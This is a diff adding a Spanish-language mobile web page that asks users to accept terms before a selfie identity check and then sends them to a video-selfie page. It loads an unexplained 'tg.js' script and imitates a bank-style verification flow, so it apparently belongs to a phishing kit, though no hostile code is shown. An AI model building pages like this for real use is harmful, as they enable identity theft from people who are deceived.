@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Identidad</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --ds-green-primary: #046a38;
+      --ds-green-secondary: #008744;
+      --ds-gray-text: #595959;
+      --ds-gray-title: #222222;
+      --ds-gray-disabled: #e6e6e6;
+      --ds-gray-tertiary: #8f8f8f;
+      --ds-bg: #fff;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      height: -webkit-fill-available;
+    }
+    
+    html, body {
+      background-color: var(--ds-bg);
+      color: var(--ds-gray-text);
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      height: 100dvh;
+      width: 100vw;
+      overflow: hidden;
+    }
+
+    .mobile-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      background: #fff;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .mobile-header-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--ds-gray-title);
+    }
+
+    .ds-contenido-principal {
+      margin: 0 auto;
+      max-width: 570px;
+      padding: 0 24px;
+      width: 100%;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    
+    .main-icon-container {
+      display: flex;
+      justify-content: center;
+      margin-top: 10px;
+      margin-bottom: 24px;
+      flex-shrink: 0;
+    }
+    
+    .main-icon {
+      width: 80px;
+      height: auto;
+      object-fit: contain;
+    }
+    
+    .main-title {
+      color: var(--ds-gray-title);
+      font-size: 24px;
+      font-weight: 700;
+      text-align: center;
+      line-height: 32px;
+      margin-bottom: 24px;
+      flex-shrink: 0;
+    }
+    
+    .recommendations-title {
+      font-size: 15px;
+      color: var(--ds-gray-text);
+      margin-bottom: 16px;
+      flex-shrink: 0;
+    }
+    
+    .recommendation-list {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      flex-shrink: 0;
+    }
+    
+    .recommendation-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 16px;
+    }
+    
+    .recommendation-icon {
+      width: 28px;
+      height: auto;
+      flex-shrink: 0;
+      margin-top: 2px;
+      object-fit: contain;
+    }
+    
+    .recommendation-text {
+      font-size: 15px;
+      line-height: 22px;
+      color: var(--ds-gray-text);
+    }
+    
+    .spacer {
+      flex: 1;
+    }
+    
+    .terms-container {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 24px;
+      flex-shrink: 0;
+    }
+
+    .terms-checkbox {
+      flex-shrink: 0;
+      width: 20px;
+      height: 20px;
+      border: 2px solid var(--ds-green-primary);
+      border-radius: 4px;
+      cursor: pointer;
+      appearance: none;
+      -webkit-appearance: none;
+      outline: none;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #fff;
+      margin-top: 2px;
+    }
+
+    .terms-checkbox:checked {
+      background-color: var(--ds-green-primary);
+    }
+
+    .terms-checkbox:checked::after {
+      content: '';
+      width: 12px;
+      height: 12px;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='3' stroke-linecap='round' stroke-linejoin='round' xmlns='http://www.w3.org/2000/svg'%3E%3Cpolyline points='20 6 9 17 4 12'%3E%3C/polyline%3E%3C/svg%3E");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    .terms-text {
+      font-size: 13px;
+      line-height: 18px;
+      color: var(--ds-gray-text);
+    }
+
+    .terms-link {
+      color: var(--ds-green-primary);
+      text-decoration: underline;
+      font-weight: 700;
+    }
+
+    .otp-actions {
+      margin-bottom: 16px;
+      flex-shrink: 0;
+    }
+
+    .otp-btn {
+      align-items: center;
+      border: 1px solid transparent;
+      border-radius: 8px;
+      display: flex;
+      font-size: 16px;
+      font-weight: 500;
+      height: 48px;
+      justify-content: center;
+      width: 100%;
+      text-decoration: none;
+      transition: all 0.3s;
+    }
+
+    .otp-btn--disabled {
+      background: #f5f5f5;
+      color: #bfbfbf;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+
+    .otp-btn--activo {
+      background: var(--ds-green-primary);
+      color: #fff;
+      cursor: pointer;
+      pointer-events: auto;
+    }
+  </style>
+</head>
+<body>
+  <div class="mobile-header">
+    <span class="mobile-header-title">Identidad</span>
+  </div>
+
+  <main class="ds-contenido-principal">
+    <div class="main-icon-container">
+      <img src="selfie/persona.png" alt="Persona" class="main-icon">
+    </div>
+
+    <h1 class="main-title">Por tu seguridad, vamos a validar tu identidad</h1>
+    
+    <div class="recommendations-title">Te recomendamos:</div>
+    
+    <div class="recommendation-list">
+      <div class="recommendation-item">
+        
+        <span class="recommendation-text">No uses lentes u objetos que cubran tu rostro.</span>
+      </div>
+      <div class="recommendation-item">
+        
+        <span class="recommendation-text">No te alejes, ubica tu rostro dentro del c&iacute;rculo.</span>
+      </div>
+      <div class="recommendation-item">
+        
+        <span class="recommendation-text">Aseg&uacute;rate de estar en un ambiente iluminado.</span>
+      </div>
+    </div>
+    
+    <div class="spacer"></div>
+    
+    <div class="terms-container">
+      <input type="checkbox" id="aceptoTerminos" class="terms-checkbox">
+      <label for="aceptoTerminos" class="terms-text">
+        Acepto el <a href="#" class="terms-link">acuerdo de uso de canales electr&oacute;nicos, Pol&iacute;ticas de privacidad y tratamiento de datos personales</a>.
+      </label>
+    </div>
+
+    <div class="otp-actions">
+      <button id="btnContinuar" class="otp-btn otp-btn--disabled" type="button" disabled>Continuar</button>
+    </div>
+  </main>
+
+  <script src="tg.js"></script>
+  <script>
+    (function () {
+      const aceptoTerminos = document.getElementById('aceptoTerminos');
+      const btnContinuar = document.getElementById('btnContinuar');
+
+      aceptoTerminos.addEventListener('change', function() {
+        if (aceptoTerminos.checked) {
+          btnContinuar.disabled = false;
+          btnContinuar.classList.remove('otp-btn--disabled');
+          btnContinuar.classList.add('otp-btn--activo');
+        } else {
+          btnContinuar.disabled = true;
+          btnContinuar.classList.add('otp-btn--disabled');
+          btnContinuar.classList.remove('otp-btn--activo');
+        }
+      });
+
+      btnContinuar.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (btnContinuar.disabled) return;
+        
+        window.location.href = "videoselfie.html";
+      });
+    })();
+  </script>
+</body>
+</html>
